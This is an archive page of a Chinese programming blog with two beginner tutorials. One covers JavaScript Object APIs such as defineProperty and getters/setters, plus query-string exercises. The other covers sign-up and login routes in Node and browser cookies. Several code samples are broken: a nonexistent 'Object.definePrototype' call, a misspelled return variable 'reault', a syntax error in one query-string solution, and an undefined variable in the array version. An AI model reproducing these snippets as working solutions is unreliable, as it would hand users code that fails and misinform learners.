<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 2 | Archives | 吴博文</title>
  <meta name="author" content="吴博文">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="吴博文"/>

  
    <meta property="og:image" content=""/>
  
  
  <link href="/favicon.ico" rel="icon" type="image/x-ico">
  <link rel="canonical" href="http://yoursite.com/archives/page/2/index.html" />
  <link rel="alternate" href="/atom.xml" title="吴博文" type="application/atom+xml">
  
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-45991394-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

</head>


<body>
  <header id="header" class="inner"><div class="blog-header">
  <h1><a href="/">吴博文</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="blog-nav">
  <ul>
    
      <li><a href="/">首页/Home</a></li>
    
      <li><a href="/archives">归档/Archives</a></li>
    
      <li><a href="/about">关于/About</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    
      <div id="main-col" class="alignleft"><div id="wrapper">
<h2 class="archive-title">Archives</h2>
<p></p>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:17:07.000Z"><a href="/2018/02/07/JS系列 -- JavaScript 对象之 API/">2018-02-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/07/JS系列 -- JavaScript 对象之 API/">JS系列 -- JavaScript 对象之 API</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>之前介绍了 <a href="https://bowen-wu.github.io/2018/01/10/JS%E7%B3%BB%E5%88%97%20--%20JavaScript%20%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">《JavaScript 对象基础》 </a>，现在我们来介绍一下挂载在 <code>Object.prototype</code> 上的属性</p>
<h1 id="Object-prototype-API"><a href="#Object-prototype-API" class="headerlink" title="Object.prototype API"></a>Object.prototype API</h1><p><code>Object.prototype</code> 表示对象的原型对象<br><code>Object.prototype</code> 属性的属性特征<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">writable ==&gt; 是否可写 ==&gt; false(默认)</span><br><span class="line">enumerable ==&gt; 是否可枚举 ==&gt; false(默认)</span><br><span class="line">configurable ==&gt; 是否可配置 ==&gt; false(默认)</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign()"></a>Object.assign()</h3><p>用于将所有可枚举属性的值从一个或多个源对象复制到目标对象并返回目标对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.assign(target, ...sources)  // target 目标对象， sources 源对象</span><br><span class="line"></span><br><span class="line">Object.assign( &#123; a: 2, b: 1 &#125;, &#123; a: 1 &#125; )   // &#123; a: 1, b: 1 &#125;</span><br><span class="line">Object.assign( &#123; a: 1, b: 2 &#125;, &#123; a: &apos;a&apos; &#125;, &#123; c: 3 &#125;, &#123; a: 4 &#125; )  // &#123; a: 4, b: 2, c: 3 &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><p>创建一个空对象，空对象的原型指向参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create( proto[, propertiesObject] ) // 第二参数为一个对象，可以写入新对象的属性 + 描述符</span><br></pre></td></tr></table></figure></p>
<h5 id="使用-Object-create-实现继承"><a href="#使用-Object-create-实现继承" class="headerlink" title="使用 Object.create() 实现继承"></a>使用 Object.create() 实现继承</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-985125c7f108b498.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Object.create 实现继承"></p>
<h3 id="Object-setPrototypeOf"><a href="#Object-setPrototypeOf" class="headerlink" title="Object.setPrototypeOf()"></a>Object.setPrototypeOf()</h3><p>设置一个指定的对象的原型到另一个对象或 <code>null</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.setPrototypeOf( obj, prototype ) // 将对象 obj 的原型设置为 prototype（原型 | null）</span><br><span class="line">obj = Object.create( prototype )  === Object.setPrototypeOf( obj, prototype )</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-defineProperty-Object-defineProperties"><a href="#Object-defineProperty-Object-defineProperties" class="headerlink" title="Object.defineProperty() | Object.defineProperties()"></a>Object.defineProperty() | Object.defineProperties()</h3><p>这两个方法都是在一个对象上定义新属性或修改现有属性，并返回对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty( obj, prop, descriptor )</span><br><span class="line">Object.defineProperties( obj, props )</span><br></pre></td></tr></table></figure></p>
<h5 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h5><p>属性描述符分为<strong>数据描述符</strong> 和 <strong>存取描述符</strong>。描述符必须是二者之一</p>
<ul>
<li>数据描述符 ==&gt; value + writable ==&gt; 具有值的属性，该值可能是可写的，也可能是不可写的</li>
<li>存取描述符 ==&gt; set + get<h6 id="描述符可选键值"><a href="#描述符可选键值" class="headerlink" title="描述符可选键值"></a>描述符可选键值</h6></li>
<li><p>configurable ==&gt; 是否可配置 ==&gt; false(默认)</p>
</li>
<li><p>enumerable ==&gt; 是否可枚举 ==&gt; false(默认)</p>
</li>
<li><p>writable ==&gt; 是否可写 ==&gt; false(默认)</p>
</li>
<li><p>value ==&gt; 属性对应的值</p>
</li>
<li><p>get ==&gt; 一个给属性提供 getter 的方法，如果没有 getter 则为 undefined。该方法返回值被用作属性值，默认为 undefined</p>
</li>
<li><p>set ==&gt; 一个给属性提供 setter 的方法，如果没有 setter 则为 undefined。该方法接受唯一参数，并将该参数的新值分配给该属性，默认为 undefined<br><img src="http://upload-images.jianshu.io/upload_images/9617841-3a71e414e2343590.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="属性描述符"><br>如果对象属性有 getter + setter ，那么调用时走 getter，赋值时走 setter，getter + setter 作用：</p>
<ol>
<li>保护私有变量</li>
<li>响应式开发 | 双向数据绑定 | MVVM （<code>Object.definedProperty() + get + set</code>）</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">let person = &#123;&#125;</span><br><span class="line">let ageValue = 18</span><br><span class="line">Object.definePrototype( person, &apos;name&apos;, &#123;</span><br><span class="line">    value: xxx,</span><br><span class="line">    configurable: false,  // 如果不写默认 false</span><br><span class="line">    writable: true,</span><br><span class="line">    enumerable: true</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Object.definePrototype( person, &apos;age&apos;, &#123;</span><br><span class="line">    configurable: false,  // 如果不写默认 false</span><br><span class="line">    enumerable: true,</span><br><span class="line">    get : function()&#123;</span><br><span class="line">        return ageValue;</span><br><span class="line">    &#125;,</span><br><span class="line">    set : function( newValue )&#123;</span><br><span class="line">        ageValue = newValue;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">person.age   // 18</span><br><span class="line">person.age = 19</span><br><span class="line">person.age  // 19</span><br><span class="line"></span><br><span class="line">Object.defineProperties( person, &#123;</span><br><span class="line">    &apos;property1&apos; : &#123;</span><br><span class="line">        value: xxx,</span><br><span class="line">        configurable: false,  // 如果不写默认 false</span><br><span class="line">        writable: true,</span><br><span class="line">        enumerable: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;property2&apos; : &#123;</span><br><span class="line">        value: xxx,</span><br><span class="line">        configurable: false,  // 如果不写默认 false</span><br><span class="line">        writable: true,</span><br><span class="line">        enumerable: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="Object-getOwnPropertyDescriptor"><a href="#Object-getOwnPropertyDescriptor" class="headerlink" title="Object.getOwnPropertyDescriptor()"></a>Object.getOwnPropertyDescriptor()</h3><p>返回制定对象上一个自有属性对应的属性描述符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyDescriptor( obj, prop )</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-getOwnPropertyNames"><a href="#Object-getOwnPropertyNames" class="headerlink" title="Object.getOwnPropertyNames()"></a>Object.getOwnPropertyNames()</h3><p>返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括 Symbol 值作为名称的属性）组成的数组</p>
<h3 id="Object-keys-Object-values"><a href="#Object-keys-Object-values" class="headerlink" title="Object.keys() | Object.values()"></a><a href="https://bowen-wu.github.io/2018/01/10/JS%E7%B3%BB%E5%88%97%20--%20JavaScript%20%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">Object.keys() | Object.values()</a></h3><h3 id="Object-prototype-hasOwnProperty"><a href="#Object-prototype-hasOwnProperty" class="headerlink" title="Object.prototype.hasOwnProperty()"></a>Object.prototype.hasOwnProperty()</h3><p>返回一个布尔值，指示对象自身属性中是否具有指定的属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.hasOwnProperty( prop )</span><br></pre></td></tr></table></figure></p>
<h1 id="使用-get-set-实现需求"><a href="#使用-get-set-实现需求" class="headerlink" title="使用 get + set 实现需求"></a>使用 get + set 实现需求</h1><p>给定一个对象 obj，返回一个新对象，新对象具有对象 obj 的所有属性，并且给新对象每个属性重新赋值都会触发修改函数，在下方代码处填写代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getReactiveObj( obj, cb )&#123;</span><br><span class="line">    // 代码 code</span><br><span class="line">&#125;</span><br><span class="line">let obj = &#123; a: &apos;a&apos;, b: &apos;b&apos; &#125;</span><br><span class="line">function fn( prop,val )&#123;</span><br><span class="line">    console.log( `$&#123; prop &#125;属性的值变为$&#123; val &#125;` )</span><br><span class="line">&#125;</span><br><span class="line">let newObj = getReactiveObj( obj, fn )</span><br><span class="line">console.log( newObj.a )  // a</span><br><span class="line">console.log( newObj.b )  // b</span><br><span class="line">newObj.a = &apos;d&apos;  // a属性的值变为d</span><br><span class="line">console.log( newObj.a )  // d</span><br><span class="line">console.log( obj )  // &#123; a: &apos;a&apos;, b: &apos;b&apos; &#125;</span><br></pre></td></tr></table></figure></p>
<p>解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getReactiveObj( obj, cb )&#123;</span><br><span class="line">    let result = &#123;&#125;</span><br><span class="line">    Object.keys( obj ).forEach( ( item ) =&gt; &#123;</span><br><span class="line">        let value = obj[ item ]</span><br><span class="line">        Object.defineProperty( result, item, &#123;</span><br><span class="line">            get() &#123;</span><br><span class="line">                return value</span><br><span class="line">            &#125;,</span><br><span class="line">            set( val ) &#123;</span><br><span class="line">                cb.call( null, item, val )</span><br><span class="line">                value = val</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; )</span><br><span class="line">    &#125;)</span><br><span class="line">    return reault</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="实现查询参数"><a href="#实现查询参数" class="headerlink" title="实现查询参数"></a>实现查询参数</h1><p>把一个 JS 对象转化成符合查询参数的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery()&#123;</span><br><span class="line">    // 代码</span><br><span class="line">&#125;</span><br><span class="line">parseToQuery(&#123; id: 100, name: &apos;hello&apos;, groups: &apos;xxx&apos; &#125;)  // &apos;id=100&amp;name=hello&amp;groups=xxx&apos; </span><br><span class="line">parseToQuery(&#123; id: 100, name: &apos;hello&apos;, groups: [ &apos;xxx&apos;, &apos;yyy&apos; ] &#125;)  // &apos;id=100&amp;name=hello&amp;groups=xxx&amp;groups=yyy&apos;</span><br></pre></td></tr></table></figure></p>
<h3 id="实现无数组方法一"><a href="#实现无数组方法一" class="headerlink" title="实现无数组方法一"></a>实现无数组方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let arr = []</span><br><span class="line">    for( let key in obj )&#123;</span><br><span class="line">        arr.push( encodeURIComponent( key ) + &apos;=&apos; + encodeURIComponent( obj[ key ] ) )</span><br><span class="line">    &#125;</span><br><span class="line">    return arr.join( &apos;&amp;&apos; )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="encodeURIComponent"><a href="#encodeURIComponent" class="headerlink" title="encodeURIComponent()"></a>encodeURIComponent()</h5><p>对统一资源标识符（URI）的组成部分进行编码的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent( str )   // URI 的组成部分</span><br></pre></td></tr></table></figure></p>
<h3 id="实现无数组方法二"><a href="#实现无数组方法二" class="headerlink" title="实现无数组方法二"></a>实现无数组方法二</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let str = &apos;&apos;</span><br><span class="line">    Object.keys( obj ).forEach( ( item ) =&gt; &#123;</span><br><span class="line">        var str1 = ` $&#123; item &#125;=$&#123; obj[ item ] &#125;&amp; `</span><br><span class="line">        str = str.concat( str1 )</span><br><span class="line">    &#125;)</span><br><span class="line">    return str.slice( 0, str.length-1 )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现无数组方法三"><a href="#实现无数组方法三" class="headerlink" title="实现无数组方法三"></a>实现无数组方法三</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    return Object.keys( obj ).map( ( key ) =&gt; &#123;</span><br><span class="line">        `$&#123; key &#125;=$&#123; obj[ key ] &#125;`).join( &apos;&amp;&apos; )</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现有数组方法"><a href="#实现有数组方法" class="headerlink" title="实现有数组方法"></a>实现有数组方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let result = &apos;&apos;</span><br><span class="line">    for( let key in obj )&#123;</span><br><span class="line">        if( obj[ key ] instanceof Array )&#123;</span><br><span class="line">            obj[ key ].forEach( (item) =&gt; &#123;</span><br><span class="line">                result += key + &apos;=&apos; + value + &apos;&amp;&apos;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            result += key + &apos;=&apos; + obj[ key ] + &apos;&amp;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result.substring( 0, result.length-1 )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:13:20.000Z"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">2018-02-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">HTTP系列 -- 注册登录 + Cookie</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>我们每天在使用电脑的时候都会去注册或者登录，作为前端是必须要了解其中的过程的。</p>
<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求注册界面时，后端要去读取注册界面，之后发给前端，并且还要设置 <code>method</code></p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_up.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户注册发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;POST&apos; )&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">    readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行验证</span><br><span class="line">    // 1. 验证用户输入是否合格</span><br><span class="line">    // 2. 验证用户名是否占用 | 邮箱是否占用（都是去和自己的数据库进行比较）</span><br><span class="line">    // 3. 验证失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 验证成功 ==&gt; 存储数据库，200</span><br><span class="line">&#125;</span><br><span class="line">function readBody( request )&#123;</span><br><span class="line">    return new Promise( ( resolve, reject ) =&gt; &#123;</span><br><span class="line">        let body = []</span><br><span class="line">        request.on( &apos;data&apos;, ( chunk ) =&gt; &#123;</span><br><span class="line">            body.push( chunk )</span><br><span class="line">        &#125;).on( &apos;end&apos;, () =&gt; &#123;</span><br><span class="line">            body = Buffer.concat( body ).toString()</span><br><span class="line">            resolve( body )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转注册界面"><a href="#跳转注册界面" class="headerlink" title="跳转注册界面"></a>跳转注册界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_up.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据"><a href="#提交用户输入数据" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h3 id="后端-1"><a href="#后端-1" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求登录界面时，后端要去读取登录界面，之后发给前端，并且还要设置 method</p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_in&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_in.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户登录发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">else if(path===&apos;/sign_in&apos; &amp;&amp; method === &apos;POST&apos;)&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">     readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行数据库比对</span><br><span class="line">    // 1. 比对用户是否存在</span><br><span class="line">    // 2. 比对用户输入密码是否正确</span><br><span class="line">    // 3. 比对失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 比对成功 ==&gt; 设置 Cookie ，200</span><br><span class="line">    response.setHeader( &apos;Set-Cookie&apos;,  &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转登录界面"><a href="#跳转登录界面" class="headerlink" title="跳转登录界面"></a>跳转登录界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_in.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据-1"><a href="#提交用户输入数据-1" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>服务器发送到用户浏览器并保存在用户本地的一小块数据，它会在浏览器下次向同一服务器再次发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。<strong>Cookie使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能</strong></p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>Cookie 主要用于以下三个方面</p>
<ol>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其他需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器跟踪行为（如跟踪用户行为等）</li>
</ol>
<h3 id="前端设置-Cookie"><a href="#前端设置-Cookie" class="headerlink" title="前端设置 Cookie"></a>前端设置 Cookie</h3><p>通过 <code>document.cookie</code> API 可以获取或设置当前文档相关联的 Cookie</p>
<h5 id="读取-Cookie"><a href="#读取-Cookie" class="headerlink" title="读取 Cookie"></a>读取 Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let  allCookie = document.cookie</span><br></pre></td></tr></table></figure>
<h5 id="设置（写一个新的）Cookie"><a href="#设置（写一个新的）Cookie" class="headerlink" title="设置（写一个新的）Cookie"></a>设置（写一个新的）Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = newCookie</span><br></pre></td></tr></table></figure>
<p><code>newCookie</code> 是一个键值对形式的字符串，使用这个方法一次只能对一个 Cookie 进行设置或更新。以下可选 Cookie 属性值可以跟在键值对后，用来具体化对 Cookie 的设置或更新，使用分号进行分隔</p>
<ul>
<li><p><code>;path = path</code> ==&gt; 如果没有定义，默认为当前文档位置的路径</p>
</li>
<li><p><code>;domain = domain</code> ==&gt; 如果没有定义，默认为当前文档位置的路径的域名部分</p>
</li>
<li><p><code>;max-age = max-age-in-seconds</code> ==&gt; 过期时长</p>
</li>
<li><p><code>;expires = date-in-GMTString-format</code> ==&gt; 如果没有定义，Cookie 会在会话结束时过期</p>
</li>
<li><p><code>;secure</code> ==&gt; Cookie 只能通过 HTTPS 传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;someCookieName=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/&quot;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="后端-code"><a href="#后端-code" class="headerlink" title="后端 + code"></a>后端 + code</h3><p>后端验证成功（200）时会设置一个 Cookie 响应头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&apos;Set-Cookie&apos;, &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure></p>
<p>设置 Cookie 之后的同源请求都会带着 Cookie</p>
<h5 id="会话期-Cookie"><a href="#会话期-Cookie" class="headerlink" title="会话期 Cookie"></a>会话期 Cookie</h5><p>浏览器关闭后会自动删除，它仅在会话期有效。会话期 Cookie 不需要指定过期时间（Expirse）或者有效期（Max-Age）</p>
